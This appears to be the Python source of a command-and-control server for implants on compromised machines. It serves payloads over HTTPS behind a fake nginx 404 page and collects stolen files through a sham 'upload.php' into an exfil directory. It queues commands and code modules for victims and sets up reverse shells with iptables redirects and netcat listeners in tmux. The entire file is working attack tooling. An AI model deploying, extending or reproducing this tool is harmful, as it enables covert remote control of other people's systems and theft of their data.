#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import urllib
from urllib.parse import urlparse
#from requests_toolbelt import MultipartDecoder
import multipart
import cgi
import logging
import json
from io import BytesIO

import subprocess

import libtmux

import validators
import shutil

import traceback
import asyncio
import time
import sys
import os
import errno
import socket
import threading

import netifaces as ni

import prompt_toolkit
from prompt_toolkit import prompt, PromptSession
from prompt_toolkit.styles import Style
from prompt_toolkit.patch_stdout import patch_stdout

from colored import fg, bg, attr
import shlex
import pty


SETTINGS = {
"exfil_dir":"/root/exfil/",
"static_dir":"static/",
"shell_dir":"shell/",
"tmux_welcome":"tmux_welcome.sh",
"LHOST":None,
"LPORT":None,
"RHOST":None,
"target":None,
"vars":["target", "LHOST", "LPORT", "RHOST"],
"protocol":"https",
"static_url":None,
"session_count":0
}

# identifier:{message:"", default:""};
force_prompt = {}

managed_sessions = []

targets = []

target_info_all = {}

tasks = {}

#target = None

#{
#target:{
#   "cmd":"cmd to fix iptables"
#}
#}
FIN_WAIT = {}

style = Style.from_dict({
    # User input (default text).
    '':          '#ff0066',

    # Prompt.
    'username': '#cc4444',
    'at':       '#00aa00',
    'colon':    '#aa0000',
    'pound':    '#00aa00',
    'hostname':     '#00ffff bg:#0011bb',
    'ip':     '#0dd000 bg:#0011bb',
    'path':     'ansicyan underline',
})

tmux = libtmux.Server()
sess = PromptSession()

curr_prompt = None


class TrashCollector(BaseHTTPRequestHandler):

    def do_404(self):
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"""
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.10.3 (Ubuntu)</center>
</body>
</html>
"""
)

    def do_GET(self):
        try:
            rel_path = os.path.normpath("./{}".format(self.path))
            path = os.path.join(SETTINGS['static_dir'], rel_path)

            logging.info("\tMapping request for {} to {}".format(self.path, path))

            f = open(path, 'rb')
            self.send_response(200)
            self.end_headers()
            print("Serving {} to {}".format(rel_path, self.get_host()))
            shutil.copyfileobj(f, self.wfile)
            f.close()
        except Exception as e:
            logging.info("{} Error serving Path: {}. {}".format(self.get_host(), path, e))
            self.do_404()

    def do_upload(self):
        # Do some browsers /really/ use multipart ? maybe Opera ?
        try:
            #self.log_message("Started file transfer")
                       
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            print("Downloading {} bytes...".format(content_length))
            #print("Content Type: {}".format(self.headers.get_content_type()))
            #print("Body: {}".format(body))
            stream = BytesIO(body)
            boundary = stream.readline()
            boundary = boundary.strip(b"\r\n")[2:]
            #print("Boundary: {}".format(boundary))
            stream.seek(0)
            parser = multipart.MultipartParser(stream, boundary)
            #print("{}".format(parser))
            
            #print("Data:\n{}".format(parser.get('data').file.read()))
            for part in parser:
                host = self.get_host().replace(":", "_")
                #print("Joining {}+{}+{}".format(SETTINGS['exfil_dir'], host , part.name))
                localpath = os.path.join(SETTINGS['exfil_dir'], host, part.name.lstrip("/"))
                #localpath = os.path.join(localpath , part.name) #.encode('utf-8')
                #print("Initial path: {}".format(localpath))
                root, ext = os.path.splitext(localpath)
                i = 1

                try:
                    os.makedirs(os.path.dirname(localpath), 755)
                except Exception as e:
                    pass

                # race condition, but hey...
                while (os.path.exists(localpath)):
                    localpath = "%s-%d%s" % (root, i, ext)
                    i = i + 1
                #print("Writing to: {}".format(localpath))
                fout = open(localpath, 'wb')
                shutil.copyfileobj(part.file, fout)
                fout.close()

                os.chmod(localpath, 755)
                #self.log_message("Received: %s", os.path.basename(localpath))

                #self.send_html(self.html("success"))
                print("Downloaded: {}".format(localpath))

        except Exception as e:
            #self.log_message(repr(e))
            print("Error downloading: {}".format(e))
            traceback.print_exc()
            #self.send_html(self.html("error"))

    def get_host(self):
        #return self.headers["Host"].strip("\r\n")
        return self.client_address[0]

    def handle_special(self, cmd, res):
        target = self.get_host()
        special = False
        if cmd == "shell_ACK":
            handle_shell(target)
            special = True
        elif cmd == "shell_FIN":
            shell_FIN(target, res)
            special = True

        if special:
            print("C2 Command: {} from {} with val {}".format(cmd, target, res))

    def do_POST(self):
        #global target
        global curr_prompt
        global loop

        if os.path.basename(urlparse(self.path).path) == "upload.php":
            return self.do_upload()

        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        
        post_data = urllib.parse.parse_qs(body.decode('utf-8'))
        #logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
        #        str(self.path), str(self.headers), str(post_data))

        host = self.get_host()
        logging.info("Host: {} Data: {}".format(host, post_data))

        old_prompt = get_prompt(target_info_all.get(host, None))

        if host not in targets:
            targets.append(host)
            tasks[host] = []
            target_info_all[host] = post_data
            target_info_all[host]["ip"] = host 
            print("Target added: {}".format(host))
            if not SETTINGS["target"]:
                SETTINGS["target"] = host

        elif post_data.get("beacon", None) == ['True']:
            target_info_all[host] = post_data
            target_info_all[host]["ip"] = host 
        else:
            if type(post_data) is dict:
                for cmd in post_data.keys():
                    #print("\nCMD: {}".format(cmd))
                    res = post_data[cmd]
                    if type(res) is list and len(res) == 1:
                        res=res[0]
                    self.handle_special(cmd, res)
                    print(res)
            else:
                print(post_data)
        target_info = target_info_all[host]
        #print("{} vs {}".format(get_prompt(target_info), old_prompt))
        if get_prompt(target_info) != old_prompt and curr_prompt:
            pass
            #print("Cancelling prompt...")
            #loop.call_soon_threadsafe(lambda res="": curr_prompt.set_result(res))

        response = BytesIO()
        response.write(pop_task(host))
        self.wfile.write(response.getvalue())

    def log_message(self, format, *args):
        logging.info("%s - - [%s] %s" % (self.address_string(),self.log_date_time_string(),format%args))

def srv(ip, port):
    httpd = HTTPServer((ip, port), TrashCollector)

    httpd.socket = ssl.wrap_socket (httpd.socket, 
            keyfile="key.pem", 
            certfile='cert.pem', server_side=True)

    logging.basicConfig(filename='server.log', level=logging.INFO) 

    httpd.serve_forever()

def pop_task(target):
    t = tasks.get(target, None)
    if not t:
        return b'Standby...'
    else:
        return json.dumps(t.pop(0)).encode('utf-8')

def task(target, cmd, args):
    global tasks
    tasks[target].append({cmd:args})

def set(k,v):
    #global target
    global SETTINGS
    if k in SETTINGS["vars"]:
        #globals()[k] = v
        SETTINGS[k] = v
    else:
        #print("Settable params: {}".format(params))
        task(SETTINGS["target"], "set", (k, v))

def show(k):
    if k in globals():
        print(globals()[k])
    else:
        print("{} not set".format(k))

def read_attr(d, attr):
    res = d.get(attr, None)
    if type(res) is list:
        if len(res) > 0:
            res = res[0]
        else:
            res=None
    return res
        

def get_prompt(target_info):
    message = [('class:pound',    '# ')]
    if target_info is not None:
        message = [
            ('class:username', read_attr(target_info, 'usr')),
            ('class:at',       '@'),
            ('class:hostname',     read_attr(target_info, 'hostname')),
            ('class:ip',     "({})".format(read_attr(target_info, 'ip'))),
            ('class:colon',    ':'),
            ('class:path',     read_attr(target_info, 'cwd')),
            message[0]
        ]
    return message

def prompt(async_=False, msg=None):
    target_info = target_info_all.get(SETTINGS['target'], None)
    if msg is None:
        msg = get_prompt(target_info)
    return sess.prompt(msg, style=style, async_=async_)

def load_module(filename):
    try:
        with open(filename) as module:
            mod = os.path.basename(filename)
            mod = os.path.splitext(mod)[0]

            code = module.read()
            task(SETTINGS["target"], 'load_module', (mod, code))
            
            print("Loading {} on {}".format(filename, SETTINGS["target"]))
    except Exception as e:
        print("Could not read file {}".format(filename))
        print(e)


def get_session_name(host):
    while True:
        name = "({})_{}".format(SETTINGS["session_count"], host.replace(".", "-"))
        SETTINGS["session_count"] = SETTINGS["session_count"] + 1
        if not tmux.has_session(name):
            break
    return name

def new_session(name, window_cmd=None, keys=None, keys_script=None):
    print("Creating new session with name: {}".format(name))
    s = tmux.new_session(name, window_command=window_cmd)
    if keys_script:
        res = subprocess.run(keys_script, stdout=subprocess.PIPE)
        keys = res.stdout.decode("utf-8")

    if keys:
        s.attached_pane.send_keys(keys)

    managed_sessions.append(name)
    #print_sessions()
    sess = tmux.find_where({ "session_name": name })
    if sess:
        i = dict(sess.items())["session_id"]
        print("\nTo interact: {}".format(i))
    else:
        print("Failed to create tmux session")



def iptables_redirect(host):
    #iptables -t nat -A PREROUTING -p tcp -s {LHOST} --dport {LPORT} -j REDIRECT --to-port {HANDLE_PORT}
    real_port = get_open_port()
    src = ""
    if host != "0.0.0.0/0":
        src = "-s {RHOST} ".format(RHOST=host)
    iptables = "iptables -t nat -{CMD} PREROUTING -p tcp {src}--dport {LPORT} -j REDIRECT {state}--to-port {REAL_PORT};"
    state = "-m state --state ESTABLISHED,RELATED "
    
    add_cmd = iptables.format(CMD="A", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state="")
    del_cmd = iptables.format(CMD="D", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state="")

    fix_cmd = iptables.format(CMD="A", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state=state)
    delfix_cmd = iptables.format(CMD="D", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state=state)
    return {"add":add_cmd, "del":del_cmd, "fix":fix_cmd, "delfix":delfix_cmd, "port":real_port}


def get_listener_cmd(port):
    return "nc -nvlp {REAL_PORT};".format(REAL_PORT=port)

# eventually: targets will be guaranteed unique, hosts (ip address) might not be
def target_to_host(target):
    return target

# client said "shell_ACK"

# Warning: Linux specific, requires iptables and tmux
def handle_shell(target, catch=False):
    host = target_to_host(target)
    #global tmux
    res = iptables_redirect(host)

    listener = get_listener_cmd(res["port"])
    # Race conditions just make your code go faster, right?
    # DANGER: will not work correctly if using "catch"
    handler_cmd = res["add"] + listener
    if catch:
        handler_cmd = handler_cmd + res["del"]
    else:
        handler_cmd = handler_cmd + res["delfix"]

    print("Handler: \n{0}\n{1}\n{0}\n".format("-"*(len(handler_cmd) + 3) , handler_cmd))
    new_session(get_session_name(host), window_cmd=handler_cmd)
    FIN_WAIT[target]["cmd"] = res["del"]+res["fix"]

    send_shell(target, FIN_WAIT[target]["shell"])


def get_shell(shell_file):
    with open(shell_file, 'r') as f:
        s = f.read()
        for setting in SETTINGS["vars"]:
            s = s.replace("{"+setting+"}", str(SETTINGS[setting]))
        return s

def send_shell(target, s):
    shell_arr = shlex.split(s)
    task(target, shell_arr[0], shell_arr[1:] )

def shell_FIN(target, success):
    if success:
        print("Running: {}".format(FIN_WAIT[target]["cmd"]))
        os.system(FIN_WAIT[target]["cmd"])
    else:
        print("shell_FIN: failed")
    print("Deleting FIN_WAIT[{}] : ".format(target, FIN_WAIT[target]))
    del FIN_WAIT[target]
    
def in_directory(file, directory):
    #make both absolute    
    directory = os.path.join(os.path.realpath(directory), '')
    file = os.path.realpath(file)

    #return true, if the common prefix of both is equal to directory
    #e.g. /a/b/c/d.rst and directory is /a/b, the common prefix is /a/b
    return os.path.commonprefix([file, directory]) == directory

def options():
    for s in SETTINGS["vars"]:
        print("{0: <10}:{1}".format(s, SETTINGS[s]))

def do(cmd):
    global managed_sessions
    #global tmux
    try:
        arr = []
        if force_prompt:
            arr = [list(force_prompt)[0], cmd]
            print(" ".join(arr))
        else:    
            arr = shlex.split(cmd)
        if not cmd:
            return
        c = arr[0]
        if c == "set":
            set(arr[1], arr[2] if len(arr) > 2 else None)
        elif c == "show" or (c in globals() and not callable(globals()[c])):
            if c == "show":
                show(arr[1])
            else:
                show(c)
        elif c == "options" or c == 'show' and len(arr) > 1 and arr[1] == "options":
            options()
        elif c =="switch":
            if targets:
                t = targets[-1]
                if t == SETTINGS["target"]:
                    t = targets[0]
                set("target", t)
        elif c == "host-shell":
            #print("Dropping to bash on host -- use 'exit' to return here")
            #pty.spawn("/bin/bash")
            #new_session(get_session_name("127.0.0.1"), window_cmd="echo 'To return: CTRL+B,D'")
            new_session(get_session_name("127.0.0.1"), keys_script=SETTINGS['tmux_welcome'])
        elif c == 'clear':
            prompt_toolkit.shortcuts.clear()
        elif c == "load_module":
            load_module(*arr[1:])
        elif c == "upload":
            path = arr[1]
            bn = os.path.basename(arr[1])
            is_url = False

            try:
                if validators.url(arr[1]):
                    is_url = True
            except Exception as e:
                pass

            if is_url:
                print("Uploading remote file: {}".format(arr[1]))
            elif bn == arr[1]:
                # assume the file is in static_dir
                path = os.path.join(SETTINGS['static_dir'], arr[1])
                print("In Static {}".format(path))
            elif not in_directory(arr[1], SETTINGS['static_dir']):
                path = os.path.join(SETTINGS['static_dir'], bn)
                print("Copying {} to {}".format(os.path.expanduser(arr[1]), path))
                shutil.copy(os.path.expanduser(arr[1]), path)
                
            else:
                print("In default {}".format(path))
                path = os.path.realpath(path)

            url = ""
            if is_url:
                url = arr[1]
            else:
                url_path = path[len(os.path.commonprefix([path, SETTINGS['static_dir']])):]
                if not is_url and not os.path.exists(path):
                    print("Error: {} does not exist - task not queued".format(path))
                else:
                    url = os.path.join(SETTINGS['static_url'], url_path)
                    print("File ready at {}".format(url))
            
            if SETTINGS["target"]:
                task(SETTINGS["target"], c, url)
            elif not force_prompt:
                print('Set a target - try "show targets"')
        elif c == 'shell':
            if len(arr) > 1 and os.path.exists(compute_path(arr[1], dir=SETTINGS['shell_dir'])):
                shell_file = compute_path(arr[1], dir=SETTINGS['shell_dir'])
                print("Reading from {}".format(shell_file))
                s = get_shell(shell_file)
                print(s)
                t = SETTINGS.get("target", None)
                if t:
                    if t in FIN_WAIT:
                        print("A shell handshake for {} is in progress -- wait until shell_FIN is received".format(t))
                    else:
                        task(t, "shell_SYN", None)
                        print("Waiting for shell_ACK...")
                        FIN_WAIT[t] = {"shell":s}
                    
                else:
                    print('Set a target - try "show targets"')
            else:
                print("Possible shells:")
                for root, dirs, file in os.walk(SETTINGS['shell_dir']):
                    for f in file:
                        p = os.path.join(root, f)
                        p = p[len(os.path.commonprefix([SETTINGS['shell_dir'], p])):]
                        print(p)
            
        elif c == 'catch':
            rhost = arr[1]
            handle_shell(rhost, catch=True)
        elif c == 'listen':
            rhost = first([SETTINGS["RHOST"], SETTINGS["target"], "0.0.0.0/0"])
            message = "Please set RHOST for the expected connection [{}]:".format(rhost)
            inner_prompt("catch", message, rhost)
        elif c == 'attach':
            tmux.attach_session(arr[1])         
        elif c.startswith("$") and c[1:].isdigit() and len(arr) == 1:
            tmux.attach_session(cmd)         
        elif c == 'sessions' and len(arr) > 1 and arr[1] == "-i":
            tmux.attach_session(arr[2])     
        elif c == 'sessions':
            print_sessions()
        elif c == 'kill_tmux':
            tmux.kill_server()
        elif c =="kill_sessions":
            if arr[1].upper() == "Y":
                kill_tmux_sessions(managed_sessions)
            else:
                print("Aborted")
            if force_prompt:
                os._exit(0)
        elif c == "exit":
            print("Killing the server...")
            #sys.exit(1)
            # ULTRA DANGER - WILL KILL TMUX globally
            #tmux.kill_server()

            managed_sessions = [s for s in managed_sessions if tmux.has_session(s)]
            if managed_sessions:
                print_sessions()
                if len(arr) > 1 and arr[1].lower() == "-y":
                    kill_tmux_sessions(managed_sessions)
                    os._exit(0)
                else:
                    msg = "Managed tmux sessions are still open. Kill them? [Y/n]:"
                    default = "Y"
                    inner_prompt("kill_sessions", msg, default)
            else:
                os._exit(0)
        else:
            if not SETTINGS["target"]:
                print('Set a target - try "show targets"')
            else:
                task(SETTINGS["target"], c, arr[1:])
    except Exception as e:
        print(e)


    

def inner_prompt(key, message, default):
    force_prompt[key]={"message":message, "default":default}

def kill_tmux_sessions(sessions):
    print("Killing Tmux Sessions...")
    for s in sessions:
        try:
            tmux.kill_session(s)
        except Exception as e:
            print(e)

def print_sessions():
    print("{0: <5}{1}".format("ID", "Name"))
    for s in tmux.list_sessions():
        items = dict(s.items())
        managed = items["session_name"] in managed_sessions
        print("{0: <5}{1: <10}{2}".format(items["session_id"], items["session_name"], "(unmanaged)" if not managed else ""))
    

def first(l):
    return next((x for x in l if x is not None), None)

def make_opt(n, opt):
    return ('class:choice', "{: <4}{}\n".format("{})".format(n), opt))

def get_srv_ip():
    ip_map = [(i, ni.ifaddresses(i)[ni.AF_INET][0]['addr']) for i in ni.interfaces() ]
    r = range(len(ip_map))

    
    message = [make_opt(n, "{: <6}({})".format(ip_map[n][0], ip_map[n][1])) for n in r ] 
    
    message.append( ("class:choice", "\nPlease Select an IP to listen on [{}]:".format(1) ))
    while True:
        choice = prompt_toolkit.prompt(message, style=style)
        if not choice:
            choice = 1
        try:        
            return ip_map[int(choice)][1]
        except Exception as e:
            print("Invalid selection")

def get_choice(msg, default):
    message = [
        ("class:choice", msg)
    ]
    #choice = prompt_toolkit.prompt(message, style=style)
    choice = prompt(msg=message)

    if not choice:
        choice = default
    return choice

def purge_nat():
    choice = get_choice("Purge the NAT Routing table? (Necessary if the server has crashed): [Y/n]", "Y")
    if choice.upper() == "Y":
        os.system("iptables -F -t nat")

def get_shell_port():
    default = 80
    message = "Please set LPORT for shells\nNote: this should A) be allowed by egress filtering and B) not be used actively used [{}]:".format(default)
    return get_choice(message, default)

def get_srv_port(ip):
    default = "443"

    while True:
        message = [
            ("class:choice", "Please Select a Port to listen on [{}]:".format(default))
        ]
        choice = prompt_toolkit.prompt(message, style=style)
        if not choice:
            choice = default
        
        wait = False
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if type(choice) == str and choice.endswith("!"):
                wait = True
                choice=choice[0:-1]
                print("Waiting for Port {} to become available...".format(choice))

            try:
                choice = int(choice)
                s.bind((ip, choice))
                s.close()
                return choice
            except socket.error as e:
                if wait:
                    s.close()
                    time.sleep(1)
                    continue
                if e.errno == errno.EADDRINUSE:
                    print("Port is already in use. Enter {}! to bind when available or pick a different port".format(choice))
                    default = "{}!".format(choice)
                else:
                    # something else raised the socket.error exception
                    print(e)

                s.close()
                break

def get_open_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",0))
    s.listen(1)
    port = s.getsockname()[1]
    s.close()
    return port


# if the user set an absolute path, use that, otherwise default to relative to install dir
def compute_path(path, dir=None):
    if dir is None:
        dir = os.getcwd()

    if not os.path.isabs(path):
        path = os.path.join(dir, path)
    return path

async def get_input():
    global curr_prompt
    global force_prompt
    dbg = 3
    while True:
        msg = None
        key = None
        if force_prompt:
            #print(force_prompt)
            try:
                key = list(force_prompt)[0]
                #print("Key: {}".format(key))
                #choice = get_choice(force_prompt[key].get('message', ""), force_prompt[key].get('default', ""))
                msg = force_prompt[key].get('message', "")
                #print(force_prompt)
            except Exception as e:
                print(e)

        future = prompt(async_=True, msg=msg)
        #print("future: {}".format(future))
        #curr_prompt = future.to_asyncio_future()
        curr_prompt = future
        #print("prompt: {}".format(curr_prompt))
        #print(force_prompt)
        res = None
        with patch_stdout():
            #print(force_prompt)
            try:
                res = await future
                #print("do({}) returned".format(res))
            except Exception as e:
                print("Exception raised during prompt: {}".format(e))
                print(str(e))
                print(e.args)
                print(type(e).__name__)

        try:
            #print("Res: {}".format(res))
            #print("Key: {}".format(key))
            if force_prompt:
                if not res:
                    res = force_prompt[key].get('default', "")
            #print("await returned")
            #print("\nCMD:{}".format(res))
            do(res)
            if key: 
                #print("Deleting {} from {}".format(key, force_prompt))
                del force_prompt[key]

        except Exception as e:
            print("Exception raised after prompt: {}".format(e))

        #if dbg <= 0:
        #    os._exit(1)
        dbg = dbg - 1

if __name__=="__main__":
    global loop

    ip = get_srv_ip()
    port = get_srv_port(ip)
    #Start thread in the background
    srv_thread = threading.Thread(target=srv, args=(ip, port))
    srv_thread.daemon = True

    SETTINGS['static_url'] = "{}://{}:{}/".format(SETTINGS['protocol'], ip, port)
    SETTINGS['LHOST'] = ip
    SETTINGS['LPORT'] = str(get_shell_port())


    for d in ['static_dir', 'shell_dir', 'tmux_welcome']:
        SETTINGS[d] = compute_path(SETTINGS[d])

    try:
        os.makedirs(static_dir)
    except Exception as e:
        pass
    print("Static URL: {} serves {}".format(SETTINGS['static_url'], SETTINGS['static_dir']))
  
    new_session(get_session_name("127.0.0.1"), keys_script=SETTINGS['tmux_welcome'])

    purge_nat()

    srv_thread.start()
    prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 

    loop = asyncio.get_event_loop()
    # Blocking call which returns when the hello_world() coroutine is done
    loop.run_until_complete(get_input())
    loop.close()
